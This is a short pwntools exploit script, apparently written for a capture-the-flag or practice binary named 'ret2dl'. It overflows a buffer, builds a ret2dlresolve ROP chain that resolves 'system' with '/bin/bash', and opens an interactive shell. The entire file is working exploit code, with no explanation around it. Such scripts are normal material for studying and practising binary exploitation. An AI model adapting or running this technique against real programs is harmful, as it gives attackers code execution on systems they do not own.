from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'

elf = ELF('./ret2dl')
libc = elf.libc

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(
    elf,
    symbol = 'system',
    args = ['/bin/bash']
)
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
print(rop.dump())

p = process(elf.path)

def db(p):
    gdb.attach(p, gdbscript='')
    pause()

# db(p)

pay = cyclic(cyclic_find(0x6161617461616173))
pay += rop.chain()
pay = pay.ljust(512, b'\x00')
pay += dlresolve.payload

p.send(pay)

p.interactive()